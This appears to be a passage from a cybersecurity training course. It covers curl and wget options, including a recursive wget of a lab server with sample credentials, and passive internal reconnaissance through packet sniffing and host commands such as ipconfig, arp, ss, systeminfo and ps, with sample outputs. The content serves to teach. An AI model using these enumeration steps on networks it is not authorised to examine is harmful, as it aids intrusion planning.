--cert <certificate[:password]>: Use the specified certificate file.
--key <key>: Use the specified private key file.
File Transfer Options

-T, --upload-file <file>: Upload a file to the server.
--limit-rate <rate>: Limit the transfer rate.
--max-redirs <num>: Set the maximum number of redirections to follow.
--range <range>: Request a specific range of bytes.
Debugging Options

-v, --verbose: Make the operation more talkative.
--trace <file>: Enable a full trace of the request and response.
--trace-ascii <file>: Trace the request and response in ASCII.
Authentication Options

--basic: Use HTTP Basic authentication.
--digest: Use HTTP Digest authentication.
--ntlm: Use NTLM authentication.
--negotiate: Use HTTP Negotiate (SPNEGO) authentication.
Miscellaneous Options

-A, --user-agent <string>: Specify a custom user-agent string.
-e, --referer <URL>: Specify a referer URL.
--proxy <[protocol://]host[:port]>: Use the specified proxy server.
-x, --proxy <[protocol://]host[:port]>: Specify a proxy.
SSL/TLS Options

--ssl: Use SSL/TLS (usually implicit, included in default behavior for HTTPS).
--tlsv1.0, --tlsv1.1, --tlsv1.2, --tlsv1.3: Use specific versions of TLS.
Output Options

-s, --silent: Silent mode (no output).
--stderr <file>: Redirect stderr to a file.
Wget

Wget works much the same way as curl, only it is used to download files from the server instead of just reading the content that is there.

Also like curl, it defaults to HTTP, but can be used with HTTPS and FTP. Wget can follow links in HTML, XHTML, and CSS pages.

Using the option of -r will download everything at the location in the folder structure and will place it in a new folder on your local system which is named after the url or IP address where the files were downloaded.


wget -r http://172.16.82.106

wget -r http://172.16.82.106:80

wget -r ftp://172.16.82.106

wget -r ftp://172.16.82.106 --user=student --password=password
Basic Options

-O, --output-document=<file>: Write the downloaded content to instead of stdout.
-o, --output-file=<file>: Log messages to .
-a, --append-output=<file>: Append messages to .
Downloading Options

-c, --continue: Continue getting a partially-downloaded file.
-N, --timestamping: Download only files that are newer than the local copies.
-r, --recursive: Download the site recursively.
Will use anonymous to authenticate unless --user=<user> and --password=<password> is used.
-l, --level=<number>: Set the maximum recursion depth.
-np, --no-parent: Don't ascend to the parent directory when downloading recursively.
-P, --directory-prefix=<prefix>: Save files to directory.
-nc, --no-clobber: Skip files that already exist.
HTTP Options

--http-user=<user>: Specify HTTP user.
--http-password=<password>: Specify HTTP password.
--header=<header>: Add custom HTTP header.
--no-check-certificate: Skip SSL certificate checks.
FTP Options

--ftp-user=<user>: Specify FTP user.
--ftp-password=<password>: Specify FTP password.
--no-iri: Disable Internationalized Resource Identifiers.
Proxy Options

--proxy=<proxy>: Use the specified proxy server.
--no-proxy: Do not use a proxy for any downloads.
Authentication Options

--user=<user>: Specify the username for authentication.
--password=<password>: Specify the password for authentication.
File Handling Options

--limit-rate=<rate>: Limit the download speed.
--wait=<seconds>: Wait the specified number of seconds between downloads.
--random-wait: Randomize wait times to avoid server overload.
Miscellaneous Options

-q, --quiet: Suppress output.
-v, --verbose: Print detailed information.
-h, --help: Display help information.
--version: Show version information.
--no-verbose: Suppress non-error messages.
Advanced Options

--mirror: Enable options suitable for mirroring websites (equivalent to -r -N -l inf --no-remove-listing).
--convert-links: Convert the links in downloaded HTML files for offline viewing.
--backup-converted: Backup files before converting them.
--timestamping: Download only files that are newer than the local copy.
--no-parent: Don't ascend to the parent directory.


Resources


Instructor Note


6.6 Describe Methods Used for Passive Internal Network Reconnaissance¶




Passive internal network reconnaissance involves discreetly acquiring information about an organization's internal network infrastructure without engaging directly with the systems. This reconnaissance method is commonly employed in the early phases of cybersecurity assessments, penetration testing, or ethical hacking within the internal network environment. In contrast to active reconnaissance, which entails the use of probes and requests, passive internal network reconnaissance centers on the unobtrusive collection of data without causing alerts or disruptions to the network's functionality. In this phase we commonly use commands on the internal system itself to collect information.



Resources


Instructor Note


6.6.1 Packet Sniffers¶
Passive Internal Network Reconnaissance: Traffic Sniffing

Sniffing network traffic is one of the most useful passive techniques, but possibly the most involved. Even without a SPAN port, useful traffic is broadcast on a switched network. ARP/NDP and DHCP requests tell about hosts; CDP and STP inform about infrastructure devices; and the Server Message Block (SMB) Protocol is always seeking peers. If the point of presence is a server, other hosts send traffic to it, then use TTLs and ephemeral ports to guess what type of OS is generating the traffic. Passive OS fingerprinting gives a much more precise guess. Remember, TTLs, MAC addresses, and IP addresses can tell if the sending system is on the local network or has to be routed.

Capturing raw signals from the wire is an easy way to learn about a network and how devices and applications communicate. Hardware-based sniffers are best for capturing raw signals from the wire, though they range in price and accessibility. Software-based sniffers rely on the NIC of the host system to relay traffic through the OS and usually cannot see all signals on the wire, such as the preamble and a frame's CRC, limiting their use in some situations. Another limiting factor of software sniffers is the operating mode of the NIC, of which two exist:

Non-promiscuous - default mode for most NICs. Only passes traffic destined for its MAC address, its multicast groups, or broadcast.
Promiscuous - the NIC passes all signals to the OS. Most Unix-based systems support promiscuous mode natively; Windows requires additional drivers to enable promiscuous mode, such as WinPcap. Most software sniffers use the standard BPF syntax. The most common output file format is the standard .pcap file (packet capture).
tcpdump - A command-line tool native to most Linux systems and has been ported to Windows and many Berkeley Software Distribution (BSD)-based systems.
Wireshark - A graphical user interface (GUI)-based tool with its own display filter syntax. Available on Windows and most Linux distributions.


Resources


Instructor Note


6.6.2 Native Host Tools¶
Passive Internal Network Reconnaissance: Information Gathering on Hosts



Resources


Instructor Note


6.6.2.1 IP Address¶
Windows: ipconfig

Linux: ifconfig (deprecated)

Linux: ip address

Windows:

The ipconfig command is a network configuration command used primarily in Windows operating systems. It displays and manages the IP configuration of network interfaces, providing details such as IP addresses, subnet masks, and default gateways.

C:\Users\Username>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:

    Connection-specific DNS Suffix  . : example.local
    Link-local IPv6 Address . . . . . : fe80::1c7b:8f5e:1f8d:9a2e%12
    IPv4 Address. . . . . . . . . . . : 192.168.1.100
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 192.168.1.1

Wireless LAN adapter Wi-Fi:

    Connection-specific DNS Suffix  . : example.local
    Link-local IPv6 Address . . . . . : fe80::14b2:6c8a:bdc9:78e5%15
    IPv4 Address. . . . . . . . . . . : 192.168.1.101
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 192.168.1.1

Tunnel adapter Teredo Tunneling Pseudo-Interface:

    Connection-specific DNS Suffix  . :
    IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6ab8:38e1:3f57:feb2:a35f
    Link-local IPv6 Address . . . . . : fe80::38e1:3f57:feb2:a35f%16
    Default Gateway . . . . . . . . . :
Linux:

The ifconfig command is a system administration utility in Unix-like operating systems for network interface configuration. It allows you to configure, manage, and query network interface parameters.

4.2BSD (1983): The introduction of the TCP/IP stack in 4.2BSD made it necessary to have tools to configure and manage network interfaces. ifconfig was developed as one of these tools to allow system administrators to configure IP addresses, netmasks, and other parameters for network interfaces.

Began to be deprecated in the early 2000s when the ip command, part of the iproute2 package, was introduced as a more powerful and versatile replacement.

1999: The iproute2 package, which includes the ip command, was introduced in the late 1990s as part of the development of more advanced networking features in the Linux kernel. The ip command provided more comprehensive network management capabilities, including support for advanced features like policy routing, network namespaces, and handling multiple addresses on interfaces.

Early 2000s: Linux distributions started to include iproute2 as the preferred tool for network configuration. However, ifconfig continued to be widely used due to its simplicity and familiarity.

2009: The official deprecation of ifconfig began to be reflected in documentation and by the Linux community, with a strong recommendation to use the ip command instead.

2010s: Major Linux distributions started to phase out ifconfig from default installations:

Debian/Ubuntu: By the release of Ubuntu 18.04 LTS (2018) and Debian 9 Stretch (2017), ifconfig was no longer installed by default, and users were encouraged to use the ip command.
Red Hat/CentOS: Similarly, by the release of CentOS/RHEL 7 (2014), the ip command became the standard, and ifconfig was relegated to legacy status.

$ ifconfig

eth0      Link encap:Ethernet  HWaddr 00:1a:2b:3c:4d:5e
            inet addr:192.168.1.100  Bcast:192.168.1.255  Mask:255.255.255.0
            inet6 addr: fe80::21a:2bff:fe3c:4d5e/64 Scope:Link
            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
            RX packets:105674 errors:0 dropped:0 overruns:0 frame:0
            TX packets:98876 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1000
            RX bytes:10214532 (10.2 MB)  TX bytes:12796432 (12.7 MB)
            Interrupt:20 Memory:fe800000-fe820000

lo        Link encap:Local Loopback
            inet addr:127.0.0.1  Mask:255.0.0.0
            inet6 addr: ::1/128 Scope:Host
            UP LOOPBACK RUNNING  MTU:65536  Metric:1
            RX packets:5432 errors:0 dropped:0 overruns:0 frame:0
            TX packets:5432 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1000
            RX bytes:431232 (431.2 KB)  TX bytes:431232 (431.2 KB)
Linux:

The ip address command is part of the ip command suite, which is included in the iproute2 package in Linux. This command is used to display and manage IP addresses, network interfaces, and their properties.

Early 2000s: Major Linux distributions started adopting iproute2 as the preferred toolset for network configuration. As iproute2 offered more advanced features, it gradually replaced the older net-tools package, which included ifconfig, route, and other utilities.

2000s: Distributions such as Debian, Red Hat, and SuSE began integrating iproute2 into their default installations. ip became the standard tool for network management.

2007: By the time of the release of Ubuntu 7.10 (Gutsy Gibbon) and similar releases from other distributions, iproute2 was widely adopted. ifconfig was still included for backward compatibility, but ip was encouraged for new scripts and configuration tasks.

2010s: As Linux distributions continued to evolve, iproute2 became the default networking tool, and ifconfig was eventually removed from the default installations of many distributions. By the time of releases like Ubuntu 18.04 LTS and Debian 9, ifconfig was no longer installed by default, reflecting the shift towards iproute2.


student@internet-host-student-01:~$ ip address
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
        valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
    link/ether fa:16:3e:b0:af:e0 brd ff:ff:ff:ff:ff:ff
    inet 10.10.0.40/27 brd 10.10.0.63 scope global eth0
        valid_lft forever preferred_lft forever
    inet6 fe80::f816:3eff:feb0:afe0/64 scope link
        valid_lft forever preferred_lft forever


Resources


Instructor Note


6.6.2.2 System DNS¶
Linux: /etc/resolv.conf

Windows: ipconfig /displaydns

Windows: ipconfig /all

Displays all current TCP/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings. Used without parameters, ipconfig displays Internet Protocol version 4 (IPv4) and IPv6 addresses, subnet mask, and default gateway for all adapters. Additional valuable information:
Linux:
The /etc/resolv.conf file is a critical configuration file in Unix-like operating systems, including Linux, that defines how DNS (Domain Name System) resolution is handled on the system. It specifies the nameservers that the system should use to resolve domain names to IP addresses.

cat /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4
search example.com
domain example.com
Windows:

The ipconfig /displaydns command is used on Windows operating systems to display the contents of the DNS resolver cache. This cache stores DNS query results that the system has previously resolved, allowing for faster access to frequently visited websites by avoiding repeated DNS lookups.

ipconfig /displaydns
Windows IP Configuration


ipconfig /displaydns

Windows IP Configuration

example.com
----------------------------------------
    Record Name . . . . . . . . . . . : example.com
    Record Type . . . . . . . . . . . : 1
    Time To Live . . . . . . . . . . . : 3600
    Data Length . . . . . . . . . . . : 4
    IP Address . . . . . . . . . . . : 93.184.216.34

anotherdomain.com
----------------------------------------
    Record Name . . . . . . . . . . . : anotherdomain.com
    Record Type . . . . . . . . . . . : 1
    Time To Live . . . . . . . . . . . : 3600
    Data Length . . . . . . . . . . . : 4
    IP Address . . . . . . . . . . . : 192.0.2.1
Windows:

The ipconfig /all command in Windows provides detailed information about the network configuration for all network interfaces on the system. This command displays comprehensive details including IP addresses, subnet masks, gateways, DNS servers, and other networking information.

ipconfig /all

Windows IP Configuration

    Host Name . . . . . . . . . . . . . . . : my-computer
    Primary Dns Suffix . . . . . . . . . . . : example.local
    Node Type . . . . . . . . . . . . . . . : Hybrid
    IP Routing Enabled. . . . . . . . . . . : No
    WINS Proxy Enabled. . . . . . . . . . . : No

Ethernet adapter Ethernet:

    Connection-specific DNS Suffix  . . . . . : example.local
    Description . . . . . . . . . . . . . : Intel(R) Ethernet Connection
    Physical Address. . . . . . . . . . . : 00-1A-2B-3C-4D-5E
    DHCP Enabled. . . . . . . . . . . . : Yes
    Autoconfiguration Enabled . . . . . . : Yes
    Link-local IPv6 Address . . . . . . . : fe80::1a2b:3c4d:5e6f%12
    IPv4 Address. . . . . . . . . . . . : 192.168.1.100
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . . : 192.168.1.1
    DHCP Server . . . . . . . . . . . : 192.168.1.1
    DNS Servers . . . . . . . . . . . : 8.8.8.8
                                        8.8.4.4
    Lease Obtained. . . . . . . . . . . : Wednesday, August 21, 2024 10:00:00 AM
    Lease Expires . . . . . . . . . . . : Thursday, August 22, 2024 10:00:00 AM

Wireless LAN adapter Wi-Fi:

    Connection-specific DNS Suffix  . . . . . : example.local
    Description . . . . . . . . . . . . . : Intel(R) WiFi 6 AX200 160MHz
    Physical Address. . . . . . . . . . . : 00-1A-2B-3C-4D-5F
    DHCP Enabled. . . . . . . . . . . . : Yes
    Autoconfiguration Enabled . . . . . . : Yes
    Link-local IPv6 Address . . . . . . . : fe80::1a2b:3c4d:5f6g%13
    IPv4 Address. . . . . . . . . . . . : 192.168.1.101
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . . : 192.168.1.1
    DHCP Server . . . . . . . . . . . : 192.168.1.1
    DNS Servers . . . . . . . . . . . : 8.8.8.8
                                        8.8.4.4
    Lease Obtained. . . . . . . . . . . : Wednesday, August 21, 2024 10:05:00 AM
    Lease Expires . . . . . . . . . . . : Thursday, August 22, 2024 10:05:00 AM

Tunnel adapter Teredo Tunneling Pseudo-Interface:

    Connection-specific DNS Suffix  . . . . . :
    Description . . . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
    Physical Address. . . . . . . . . . . : N/A
    DHCP Enabled. . . . . . . . . . . . : No
    Autoconfiguration Enabled . . . . . . : Yes
    IPv6 Address. . . . . . . . . . . . : 2001:0:abcd:1234:5678:90ab:cdef:1234
    Link-local IPv6 Address . . . . . . . : fe80::abcd:1234:5678:90ab%14
    Default Gateway . . . . . . . . . . : N/A


Resources


Instructor Note


6.6.2.3 ARP (Address Resolution Protocol)¶
Windows: arp -a

Linux: arp -a (depreciated)

Linux: ip neighbor

The arp -a command is used in Windows, Linux, and macOS to display the Address Resolution Protocol (ARP) cache. The ARP cache contains mappings of IP addresses to MAC (Media Access Control) addresses on the local network. This helps facilitate communication within a local network by resolving IP addresses to hardware addresses.
Windows:
The arp -a command on Windows is used to display the Address Resolution Protocol (ARP) table, which maps IP addresses to MAC addresses on the local network. This table helps in determining the hardware address of devices within the same network segment.

arp -a

Interface: 192.168.1.10 --- 0x6
  Internet Address      Physical Address      Type
  192.168.1.1          00-1a-2b-3c-4d-5e     dynamic
  192.168.1.15         00-1e-2f-3d-4c-5b     dynamic
  192.168.1.20         00-2f-3a-4b-5c-6d     dynamic
Linux:
The ip neighbor command, part of the iproute2 suite on Linux, is used to manage and display the ARP (Address Resolution Protocol) or NDP (Neighbor Discovery Protocol) table entries. These tables map IP addresses to MAC addresses for IPv4 (ARP) and IPv6 (NDP) communication.

student@internet-host-student-01:~$ ip neighbor
10.10.0.62 dev eth0 lladdr fa:16:3e:b2:eb:3b REACHABLE


Resources


Instructor Note


6.6.2.4 Netstat/ss¶
Windows: netstat

Linux: netstat (depreciated)

Linux: ss

netstat (Network Statistics) is a legacy tool that provides information about network connections, routing tables, interface statistics, and more. It is available on various operating systems including Linux, Windows, and macOS.

ss (Socket Statictics) is a more modern utility that is part of the iproute2 package on Linux. It provides detailed information about network sockets and is designed to be faster and more efficient than netstat.

Example options useful for both netstat and ss:
-a = Displays all active connections and ports.
-n = No determination of protocol names. Shows 22 not SSH.
-t = Display only TCP connections.
-u = Display only UDP connections.
-p = Shows which processes are using which sockets.
-l = Displays only listening sockets.
-r = Display routing information.
-e = Display extended socket information.
-h = Display help message with usage information.
-s = Display summary statistics.
-o = Show timer information (TCP).

student@internet-host-student-01:~$ ss -antlp
State       Recv-Q Send-Q                 Local Address:Port                                Peer Address:Port
LISTEN      0      128                                *:23                                             *:*
LISTEN      0      128                        127.0.0.1:6010                                           *:*
LISTEN      0      128                        127.0.0.1:6011                                           *:*
LISTEN      0      128                                *:80                                             *:*
LISTEN      0      128                                *:22                                             *:*
LISTEN      0      128                              ::1:6010                                          :::*
LISTEN      0      128                              ::1:6011                                          :::*
LISTEN      0      2                                 :::3389                                          :::*
LISTEN      0      128                               :::80                                            :::*
LISTEN      0      32                                :::21                                            :::*
LISTEN      0      128                               :::22                                            :::*
LISTEN      0      2                                ::1:3350                                          :::*


Resources


Instructor Note


6.6.2.5 Services File¶
Windows: %SystemRoot%\system32\drivers\etc\services

Linux/Unix: /etc/services

The services file provides a list of well-known port numbers mapped to each commonly associated service and any optional aliases that the service may use. Each OS maintains this file, which follows a simple structure.

Keep in mind that the port mappings are just a simple translation from port to service name. It is possible for an HTTP server to be listening on port 23, but the OS which is using the services file would still list telnet.

services file format:


<service> <port>/<protocol> <aliases> #Comments
Example:


http 80/tcp www www-http #World Wide Web
In this example, TCP port 80 is associated with the http service and two optional aliases, www and www-http, are given. The services file is located most commonly in the /etc/ directory and the table below shows common locations by OS.


Protocol & Port Common Service
TCP 21 FTP
TCP 22 Secure Shell (SSH)
TCP 23 Telnet
TCP 25 SMTP (email)
TCP/UDP 53 DNS
UDP 67/68 DHCP
TCP 80 HTTP
TCP 110 POP3 (email)
UDP 123 Network Time
Protocol (NTP)
TCP 443 HTTPS
TCP 445 Server Message Block (SMB) (File Sharing)
UDP 514 Syslog


Resources


Instructor Note


6.6.2.6 Operating System Information¶
Linux: cat /etc/os-release

Linux: lsb_release -a

Linux: uname -a

Windows: systeminfo

Windows: ver

Windows: wmic os get { Caption, Version, BuildNumber, OSArchitecture }

Linux

To determine Linux operating system information from the command line, you can use various commands depending on the specific information you need:

Displays various details about the operating system, including name, version, and ID:

cat /etc/os-release
Provides detailed information about the Linux distribution, including distributor ID, description, release, and codename:

lsb_release -a
Provides the kernel name, network node hostname, kernel release, kernel version, machine hardware name, processor type, hardware platform, and the operating system:

uname -a
Displays the kernel version and other relevant details:

cat /proc/version
Shows the system architecture. It shows whether the system is running on a 32-bit or 64-bit architecture:

arch
Hardware Information:

lshw            : Lists detailed hardware configuration.
lscpu           : Displays CPU information.
lsblk           : Lists block devices (disk drives).
Windows

To determine Windows operating system information from the command line:

Operating System Version:
Displays detailed system information, including OS version, build number, and installed hotfixes.

systeminfo
Displays the Windows version:

ver
System Architecture:

wmic os get osarchitecture
Hardware Information:

wmic cpu get name                 : Displays CPU information.
wmic diskdrive get caption        : Lists disk drives.
wmic memorychip get capacity      : Shows installed memory capacity.


Resources


Instructor Note


6.6.2.7 Local Processes¶
Windows: tasklist

Linux/Unix: top

Linux/Unix: ps

Windows:
The tasklist command is used in Windows to display a list of currently running processes on a local or remote computer. It provides details such as the process ID (PID), memory usage, and executable name.

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0         24 K
System                           4 Services                   0        208 K
smss.exe                       408 Services                   0        568 K
csrss.exe                      516 Services                   0      1,092 K
wininit.exe                     624 Services                   0        832 K
services.exe                    648 Services                   0      1,156 K
lsass.exe                       664 Services                   0      1,576 K
svchost.exe                     728 Services                   0      1,788 K
svchost.exe                     844 Services                   0      1,856 K
explorer.exe                    992 Console                    1      9,220 K
cmd.exe                        1240 Console                    1      5,680 K
Linux:
The ps command is used on Unix-like operating systems (such as Linux and macOS) to display information about active processes. Unlike top, which provides a dynamic, real-time view of processes, ps provides a snapshot of current processes.
-e - Select all processes. Identical to -A.
-l - Long format. The -y option is often useful with this.
-f - Do full-format listing.

student@internet-host-student-01:~$ ps -elf
F S UID        PID  PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
4 S root         1     0  0  80   0 - 14322 -      Jul01 ?        00:00:43 /sbin/init
1 S root         2     0  0  80   0 -     0 -      Jul01 ?        00:00:00 [kthreadd]
1 S root         3     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [ksoftirqd/0]
1 S root         5     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [kworker/0:0H]
1 S root         7     2  0  80   0 -     0 -      Jul01 ?        00:00:19 [rcu_sched]
1 S root         8     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [rcu_bh]
1 S root         9     2  0 -40   - -     0 -      Jul01 ?        00:00:02 [migration/0]
1 S root        10     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [lru-add-drain]
5 S root        11     2  0 -40   - -     0 -      Jul01 ?        00:00:01 [watchdog/0]
1 S root        12     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [cpuhp/0]
1 S root        13     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [cpuhp/1]
5 S root        14     2  0 -40   - -     0 -      Jul01 ?        00:00:01 [watchdog/1]
1 S root        15     2  0 -40   - -     0 -      Jul01 ?        00:00:01 [migration/1]
1 S root        16     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [ksoftirqd/1]
1 S root        18     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [kworker/1:0H]
5 S root        19     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [kdevtmpfs]
1 S root        20     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [netns]
1 S root        21     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [khungtaskd]
1 S root        22     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [oom_reaper]
1 S root        23     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [writeback]
1 S root        24     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [kcompactd0]
1 S root        26     2  0  85   5 -     0 -      Jul01 ?        00:00:00 [ksmd]
1 S root        27     2  0  99  19 -     0 -      Jul01 ?        00:00:00 [khugepaged]
1 S root        28     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [crypto]
1 S root        29     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [kintegrityd]
1 S root        30     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        31     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [kblockd]
1 S root        32     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [devfreq_wq]
1 S root        33     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [watchdogd]
1 S root        34     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [kswapd0]
1 S root        35     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [vmstat]
1 S root        47     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [kthrotld]
1 S root        48     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [ipv6_addrconf]
1 S root        84     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        85     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        86     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        87     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [ata_sff]
1 S root        88     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        90     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        91     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        92     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root        93     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root       120     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root       121     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [scsi_eh_0]
1 S root       122     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [scsi_tmf_0]
1 S root       123     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [scsi_eh_1]
1 S root       124     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [scsi_tmf_1]
1 S root       126     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [bioset]
1 S root       157     2  0  60 -20 -     0 -      Jul01 ?        00:00:04 [kworker/1:1H]
1 S root       159     2  0  80   0 -     0 -      Jul01 ?        00:00:09 [jbd2/vda1-8]
1 S root       160     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [ext4-rsv-conver]
1 S root       206     2  0  60 -20 -     0 -      Jul01 ?        00:00:06 [kworker/0:1H]
4 S root       208     1  0  80   0 - 16130 -      Jul01 ?        00:00:29 /lib/systemd/systemd-journald
1 S root       215     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [kauditd]
4 S root       222     1  0  80   0 - 11662 -      Jul01 ?        00:00:00 /lib/systemd/systemd-udevd
1 S root       270     2  0  80   0 -     0 -      Jul01 ?        00:00:00 [hwrng]
1 S root       274     2  0  60 -20 -     0 -      Jul01 ?        00:00:00 [ttm_swap]
1 S root       424     1  0  80   0 -  5089 -      Jul01 ?        00:00:02 /sbin/dhclient -4 -v -pf /run/dhclient.eth0.pid -lf
4 S root       531     1  0  80   0 -  9515 -      Jul01 ?        00:00:01 /lib/systemd/systemd-logind
4 S root       532     1  0  80   0 -  9048 -      Jul01 ?        00:00:26 /usr/sbin/inetd
4 S root       536     1  0  80   0 -  7400 -      Jul01 ?        00:00:01 /usr/sbin/cron -f
4 S avahi      537     1  0  80   0 - 11753 -      Jul01 ?        00:00:00 avahi-daemon: running [internet-host-student-20.loc
4 S root       538     1  0  80   0 -  2782 -      Jul01 ?        00:00:00 /bin/bash /usr/share/cctc/autorun.sh
4 S root       542     1  0  80   0 - 62528 -      Jul01 ?        00:00:06 /usr/sbin/rsyslogd -n
0 S root       546   538  0  80   0 -  7170 -      Jul01 ?        00:00:00 /usr/bin/python3 /usr/share/cctc/datagram_socket_re
1 S avahi      548   537  0  80   0 - 11753 -      Jul01 ?        00:00:00 avahi-daemon: chroot helper
4 S root       549     1  0  80   0 -  8981 -      Jul01 ?        00:00:16 /usr/sbin/irqbalance --foreground
4 S rtkit      550     1  0  81   1 - 44327 -      Jul01 ?        00:00:06 /usr/lib/rtkit/rtkit-daemon
4 S unscd      556     1  0  80   0 -  4201 -      Jul01 ?        00:00:02 /usr/sbin/nscd -d
4 S message+   557     1  0  80   0 -  9205 -      Jul01 ?        00:02:00 /usr/bin/dbus-daemon --system --address=systemd: --
4 S root       614     1  0  80   0 -  1456 -      Jul01 ttyS0    00:00:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt
4 S root       615     1  0  80   0 -  1110 -      Jul01 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
4 S root       621     1  0  80   0 - 72452 -      Jul01 ?        00:00:00 /usr/sbin/lightdm
1 S root       632     1  0  80   0 -  6622 -      Jul01 ?        00:00:00 /usr/sbin/xrdp-sesman
5 S root       637     1  0  80   0 - 37772 -      Jul01 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on;
5 S www-data   638   637  0  80   0 - 37856 -      Jul01 ?        00:00:00 nginx: worker process
5 S www-data   639   637  0  80   0 - 37856 -      Jul01 ?        00:00:44 nginx: worker process
5 S ntp        653     1  0  80   0 - 24463 -      Jul01 ?        00:00:36 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:109
1 S xrdp       661     1  0  80   0 -  5730 -      Jul01 ?        00:00:03 /usr/sbin/xrdp
4 S root       668     1  0  80   0 - 15915 -      Jul01 ?        00:00:03 /usr/sbin/sshd -D
4 S root       671   621  0  80   0 - 93765 -      Jul01 tty7     00:00:13 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/li
5 S root       726     1  0  80   0 - 44033 -      Jul01 ?        00:05:02 /usr/bin/python -O /usr/share/wicd/daemon/wicd-daem
0 S root       740   726  0  80   0 - 25129 -      Jul01 ?        00:02:06 /usr/bin/python -O /usr/share/wicd/daemon/monitor.p
4 S root       745   621  0  80   0 - 58809 -      Jul01 ?        00:00:00 lightdm --session-child 18 21
4 S lightdm    751     1  0  80   0 - 14132 -      Jul01 ?        00:00:00 /lib/systemd/systemd --user
5 S lightdm    776   751  0  80   0 - 21741 -      Jul01 ?        00:00:00 (sd-pam)
4 S lightdm    784   745  0  80   0 - 154428 -     Jul01 ?        00:02:32 /usr/sbin/lightdm-gtk-greeter
0 S lightdm    808     1  0  80   0 - 87168 -      Jul01 ?        00:00:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-
0 S lightdm    813   751  0  80   0 -  9137 -      Jul01 ?        00:00:00 /usr/bin/dbus-daemon --session --address=systemd: -
0 S lightdm    816   808  0  80   0 -  9137 -      Jul01 ?        00:00:00 /usr/bin/dbus-daemon --config-file=/usr/share/defau
0 S lightdm    825     1  0  80   0 - 55077 -      Jul01 ?        00:00:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome
0 S lightdm    829   751  0  80   0 - 71040 -      Jul01 ?        00:00:00 /usr/lib/gvfs/gvfsd
0 S lightdm    839   751  0  80   0 - 88036 -      Jul01 ?        00:00:00 /usr/lib/gvfs/gvfsd-fuse /run/user/112/gvfs -f -o b
0 S root       997   621  0  80   0 - 22394 -      Jul01 ?        00:00:00 lightdm --session-child 14 21
1 S root      9663     2  0  80   0 -     0 -      00:00 ?        00:00:08 [kworker/0:2]
0 S student  16098 18446  0  80   0 -  9137 SyS_ep Jul06 ?        00:00:00 /usr/bin/dbus-daemon --session --address=systemd: -
0 S student  16103 18446  0  80   0 - 71040 SyS_po Jul06 ?        00:00:00 /usr/lib/gvfs/gvfsd
